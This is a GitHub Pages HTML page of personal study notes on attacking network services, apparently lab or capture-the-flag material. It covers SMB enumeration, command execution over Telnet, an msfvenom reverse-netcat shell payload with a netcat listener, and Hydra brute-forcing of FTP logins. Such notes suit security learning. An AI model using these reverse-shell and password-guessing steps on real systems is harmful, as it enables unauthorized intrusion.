<!DOCTYPE html>
<html lang="en-US">

  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,maximum-scale=2">
    <link rel="stylesheet" type="text/css" media="screen" href="/network_services_exploitation/assets/css/style.css?v=67abed535dafdf983d692d95af38df764c10319f">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>network services exploitation cheatsheet | network_services_exploitation</title>
<meta name="generator" content="Jekyll v3.9.2" />
<meta property="og:title" content="network services exploitation cheatsheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My notes about network services exploitation" />
<meta property="og:description" content="My notes about network services exploitation" />
<link rel="canonical" href="https://pedrogg0.github.io/network_services_exploitation/" />
<meta property="og:url" content="https://pedrogg0.github.io/network_services_exploitation/" />
<meta property="og:site_name" content="network_services_exploitation" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="network services exploitation cheatsheet" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebSite","description":"My notes about network services exploitation","headline":"network services exploitation cheatsheet","name":"network_services_exploitation","url":"https://pedrogg0.github.io/network_services_exploitation/"}</script>
<!-- End Jekyll SEO tag -->

    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/network_services_exploitation/favicon.ico" -->

<!-- end custom head snippets -->

  </head>

  <body>

    <!-- HEADER -->
    <div id="header_wrap" class="outer">
        <header class="inner">
          
            <a id="forkme_banner" href="https://github.com/pedrogg0/network_services_exploitation">View on GitHub</a>
          

          <h1 id="project_title">network_services_exploitation</h1>
          <h2 id="project_tagline">My notes about network services exploitation</h2>

          
        </header>
    </div>

    <!-- MAIN CONTENT -->
    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <h1 id="network-services-exploitation-cheatsheet">network services exploitation cheatsheet</h1>

<p>Before everything: make a nmap scan for finding open and vulnerable ports.</p>

<h2 id="smb">SMB</h2>

<p>Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.</p>

<h3 id="enum4linux">Enum4linux</h3>

<p>It is a tool used to enumerate SMB shares. Makes it easy to quickly extract information from the target pertaining to SMB.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  SYNTAX = "enum4linux [options] ip"
    
 OPTIONS:
 
 -U             get userlist
 -M             get machine list
 -N             get namelist dump (different from -U and-M)
 -S             get sharelist
 -P             get password policy information
 -G             get group and member list

 -a             all of the above (full basic enumeration)
</code></pre></div></div>
<h3 id="exploiting-smb">Exploiting SMB</h3>

<p>find vulnerabilities in https://www.cvedetails.com/</p>

<h4 id="using-smbclient">Using SMBCLIENT</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> SYNTAX: smbclient //[IP]/[SHARE]
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Followed by: 

-U [name] : to specify the user

-p [port] : to specify the port
</code></pre></div></div>

<h2 Telnet /h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  SYNTAX: "telnet [ip][port]"
</code></pre></div></div>

<h4 Enumerating telnet/h4>

<p>check:</p>

<p>https://www.cvedetails.com/
 https://cve.mitre.org/</p>

<p>for finding vulnerabilities.</p>

<p>Also, we can find an obvious misconfiguration that let us exploit it.</p>

<h4 Connecting Telnet/h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  SYNTAX: "telnet [ip] [port]"
</code></pre></div></div>

<p>In case we can`t see if we are executing what we type we can use <strong>tcpdump</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo tcpdump ip proto \\icmp -i tun0 //tun0 = network interface in use
</code></pre></div></div>
<p>We need to preface the commands in the telnet machine terminal with “.RUN”</p>

<p>ex:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> .RUN ping -c 1 [attackingMachine.localhost] //we can use that command                      to see that we are correctly executing code]
</code></pre></div></div>

<h4 Generating a reverse shell payload (using msfvenom)/h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> SYNTAX: **"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
 
  Where:
  -p = payload
  lhost = our local host IP address (this is your machine's IP address)
  lport = the port to listen on (this is the port on your machine)
  R = export the payload in raw format
</code></pre></div></div>

<p>Now we can use a netcat listener on our local machine:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  "nc -lvp [listening port]" 
</code></pre></div></div>
<p>We just need to copy and paste our msfvenom payload into the telnet session and run it as a command. Then we’ll be able to use a shell through the listener previously deployed.</p>

<h2 FTP /h2>

<p>Standard FTP port = 21</p>

<h4 Enumerating ftp /h4>

<p>We’re going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system.</p>

<p>Alternative Enumeration Methods</p>

<p>It’s worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the “cwd” command for home directories which exist and those that don’t.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"ftp [IP]"
</code></pre></div></div>

<h3 id="exploiting-ftp">Exploiting FTP</h3>

<p>If we have a possible username we can try to apply bruteforce using hydra.</p>

<p>```
“hydra -t 4 -l [USER] dale -P [PATH TO DICTIONARY] -vV [MACHINE IP] ftp”
``
PATH TO DICTIONARY in my case is: /usr/share/wordlists/passwords/rock-you05.txt</p>


      </section>
    </div>

    <!-- FOOTER  -->
    <div id="footer_wrap" class="outer">
      <footer class="inner">
        
        <p class="copyright">network_services_exploitation maintained by <a href="https://github.com/pedrogg0">pedrogg0</a></p>
        
        <p>Published with <a href="https://pages.github.com">GitHub Pages</a></p>
      </footer>
    </div>
  </body>
</html>

